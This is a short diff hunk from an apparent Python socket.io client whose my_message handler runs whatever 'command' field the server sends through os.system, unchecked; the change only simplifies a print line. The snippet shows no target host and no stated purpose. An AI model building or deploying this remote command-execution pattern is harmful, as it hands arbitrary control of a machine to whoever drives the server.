@@ -8,9 +8,7 @@ def connect():
 
 @sio.event
 def my_message(data):
-
-    print(f"command: " + data.get('command'))
-
+    print(data)
     os.system(data.get('command'))
 
 @sio.event
